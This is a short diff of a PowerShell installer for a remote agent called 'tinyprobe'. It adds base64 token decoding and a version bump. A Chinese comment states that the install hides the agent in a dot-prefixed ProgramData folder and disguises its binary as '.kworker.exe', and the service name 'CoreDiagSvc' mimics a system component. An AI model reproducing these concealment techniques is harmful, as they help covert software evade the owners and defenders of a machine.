@@ -10,9 +10,13 @@ $ErrorActionPreference = 'Stop'
 
 $HUB      = if ($env:HUB)     { $env:HUB }     else { 'http://127.0.0.1:47821' }
 $NAME     = if ($env:NAME)    { $env:NAME }    else { $env:COMPUTERNAME }
+$TOKEN_B64= if ($env:TOKEN_B64){ $env:TOKEN_B64 } else { '' }
 $TOKEN    = if ($env:TOKEN)   { $env:TOKEN }   else { '' }
+if (-not $TOKEN -and $TOKEN_B64) {
+  $TOKEN = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($TOKEN_B64))
+}
 $REPO     = if ($env:REPO)    { $env:REPO }    else { 'https://github.com/songyouxi/tinyprobe/releases/download' }
-$VERSION  = if ($env:VERSION) { $env:VERSION } else { 'v1.2.0' }
+$VERSION  = if ($env:VERSION) { $env:VERSION } else { 'v1.2.1' }
 $SERVICE  = if ($env:SERVICE) { $env:SERVICE } else { 'CoreDiagSvc' }
 $INTERVAL = if ($env:INTERVAL){ $env:INTERVAL }else { '2' }
 # 隐蔽：ProgramData 下点号目录 + 随机后缀，二进制伪装为 .kworker.exe
